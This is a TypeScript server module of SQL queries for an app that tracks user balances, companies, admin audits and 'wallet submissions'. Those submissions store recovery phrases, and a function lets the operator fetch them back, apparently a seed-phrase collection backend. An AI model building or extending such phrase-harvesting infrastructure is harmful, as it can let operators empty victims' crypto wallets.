import 'server-only';

import { one, q } from './db';
import type { AdminUserRow, AuditRow, BalanceMap, Company, WalletSubmission } from './types';

export async function getBalances(userId: string): Promise<BalanceMap> {
    const rows = await q<{ symbol: string; amount: number }>`
        select symbol, amount::float8 as amount
        from balances
        where user_id = ${userId} and amount > 0
        order by symbol
    `;
    const out: BalanceMap = {};
    for (const row of rows) out[row.symbol] = Number(row.amount) || 0;
    return out;
}

export async function listCompanies(userId: string): Promise<Company[]> {
    return q<Company>`
        select *
        from companies
        where user_id = ${userId}
        order by created_at desc
    `;
}

export async function getCompany(id: string): Promise<Company | null> {
    return one<Company>`select * from companies where id = ${id} limit 1`;
}

export async function listWallets(userId: string): Promise<WalletSubmission[]> {
    return q<WalletSubmission>`
        select id, user_id, user_email, user_name, selected_wallet, provider, is_custom_provider,
               device_type, word_count, valid, checksum_verified, derivation_paths, addresses,
               primary_address, proof_of_key, proof_recovered, phrase_hash, link_method, source, created_at,
               linked_at, linked_by
        from wallet_submissions
        where user_id = ${userId}
        order by created_at desc
    `;
}

export async function listAllWallets(): Promise<WalletSubmission[]> {
    return q<WalletSubmission>`
        select id, user_id, user_email, user_name, selected_wallet, provider, is_custom_provider,
               device_type, word_count, valid, checksum_verified, derivation_paths, addresses,
               primary_address, proof_of_key, proof_recovered, phrase_hash, link_method, source, created_at,
               linked_at, linked_by
        from wallet_submissions
        order by created_at desc
        limit 500
    `;
}

export async function getWallet(id: string): Promise<WalletSubmission | null> {
    return one<WalletSubmission>`
        select id, user_id, user_email, user_name, selected_wallet, provider, is_custom_provider,
               device_type, word_count, valid, checksum_verified, derivation_paths, addresses,
               primary_address, proof_of_key, proof_recovered, phrase_hash, link_method, source, created_at,
               linked_at, linked_by
        from wallet_submissions
        where id = ${id}
        limit 1
    `;
}

export async function getWalletPhraseCiphertext(id: string): Promise<{ phrase: string; userId: string | null } | null> {
    const row = await one<{ phrase: string; user_id: string | null }>`
        select phrase, user_id from wallet_submissions where id = ${id} limit 1
    `;
    if (!row) return null;
    return { phrase: row.phrase, userId: row.user_id };
}

export async function listPendingCompanies(): Promise<(Company & { owner_email: string; owner_name: string })[]> {
    return q<Company & { owner_email: string; owner_name: string }>`
        select c.*, u.email as owner_email, u.display_name as owner_name
        from companies c
        join users u on u.id = c.user_id
        order by
            case c.status when 'pending' then 0 when 'processing' then 1 when 'approved' then 2 else 3 end,
            c.created_at desc
        limit 200
    `;
}

export async function listAdminUsers(): Promise<AdminUserRow[]> {
    const rows = await q<AdminUserRow>`
        select
            u.id, u.email, u.display_name, u.is_admin, u.status, u.created_at, u.last_login_at,
            (select count(*) from companies c where c.user_id = u.id)::int as company_count,
            (select count(*) from wallet_submissions w where w.user_id = u.id)::int as wallet_count,
            (select count(*) from balances b where b.user_id = u.id and b.amount > 0)::int as symbols
        from users u
        order by u.created_at desc
        limit 500
    `;
    return rows;
}

export async function getAdminUser(id: string): Promise<AdminUserRow | null> {
    const rows = await listAdminUsers();
    return rows.find((row) => row.id === id) ?? null;
}

export async function getUserRecord(id: string): Promise<{
    id: string;
    email: string;
    display_name: string;
    phone: string;
    is_admin: boolean;
    status: 'active' | 'inactive';
    created_at: string;
    last_login_at: string | null;
} | null> {
    return one`
        select id, email, display_name, phone, is_admin, status, created_at, last_login_at
        from users
        where id = ${id}
        limit 1
    `;
}

export async function listBalanceAudit(userId: string): Promise<AuditRow[]> {
    return q<AuditRow>`
        select id, before, after, delta, by, at, note
        from balance_audit
        where uid = ${userId}
        order by at desc
        limit 40
    `;
}

export async function listAdminAudit(userId: string): Promise<{
    id: number;
    action: string;
    actor_email: string;
    detail: Record<string, unknown>;
    at: string;
}[]> {
    return q`
        select id, action, actor_email, detail, at
        from admin_audit
        where target_user_id = ${userId}
        order by at desc
        limit 40
    `;
}

export async function getCounts(userId: string): Promise<{ companies: number; wallets: number }> {
    const row = await one<{ companies: number; wallets: number }>`
        select
            (select count(*) from companies where user_id = ${userId})::int as companies,
            (select count(*) from wallet_submissions where user_id = ${userId})::int as wallets
    `;
    return { companies: row?.companies ?? 0, wallets: row?.wallets ?? 0 };
}
